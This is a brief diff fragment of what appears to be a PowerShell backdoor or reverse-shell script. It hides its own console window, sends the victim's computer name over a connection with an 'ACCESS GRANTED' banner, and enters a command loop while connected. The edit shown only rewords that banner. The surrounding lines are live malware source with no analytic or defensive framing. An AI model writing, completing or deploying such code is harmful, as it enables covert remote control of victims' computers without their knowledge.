@@ -21,7 +21,7 @@ try {
             $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
         } catch {}
 
-        $w.WriteLine("--- ATOMIC ACCESS GRANTED: $env:COMPUTERNAME ---")
+        $w.WriteLine("--- PC ACCESS GRANTED TO: $env:COMPUTERNAME ---")
 
         # 4. MAIN COMMAND LOOP
         while($c.Connected) {
